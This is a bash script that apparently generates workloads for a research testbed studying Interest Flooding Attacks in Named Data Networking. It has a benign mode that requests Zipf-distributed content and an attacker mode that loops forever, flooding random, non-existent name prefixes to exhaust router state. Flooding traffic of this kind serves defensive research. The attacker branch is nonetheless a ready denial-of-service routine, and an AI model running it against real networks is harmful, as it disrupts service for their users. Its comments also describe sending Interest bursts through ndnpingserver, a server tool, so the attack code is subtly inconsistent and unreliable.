#!/bin/bash
# --- FL-IFAshield Workload Generation Controller ---
ROLE=$1       # Options: "benign" or "attacker"
INTENSITY=$2  # Packets per second (e.g., 500 for normal, 5000 for attack vector saturation)

if [ -z "$ROLE" ] || [ -z "$INTENSITY" ]; then
    echo "Usage: $0 [benign|attacker] [intensity_pps]"
    exit 1
fi

echo "[+] Starting payload delivery profile configuration as role: $ROLE ($INTENSITY pps)"

if [ "$ROLE" == "benign" ]; then
    # Executes a localized native client pulling content identifiers according to a Zipf distribution (alpha=0.7)
    ndncatchunks /ndn/iotlab/grenoble/content/zipf \
        --rate $INTENSITY \
        --alpha 0.7 \
        --pipeline-type fixed \
        --lifetime 4000 > /dev/null 2>&1 &
        
elif [ "$ROLE" == "attacker" ]; then
    # Orchestrates a randomized Dynamic/Collusive IFA campaign (CIFA)
    # Floods unique, non-existent cryptographic name prefixes rapidly to maximize entry exhaustion
    while true; do
        # Generate high-entropy randomized name tokens
        RANDOM_PREFIX=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1)
        
        # Fire structural Interest bursts directly via lightweight packet injectors
        ndnpingserver -c 1 "/ndn/malicious/attack-cluster-${RANDOM_PREFIX}" &
        
        # Micro-sleep scaling interval calculation to perfectly mirror targeting rate requirements
        sleep $(bc -l <<< "1/${INTENSITY}")
    done
fi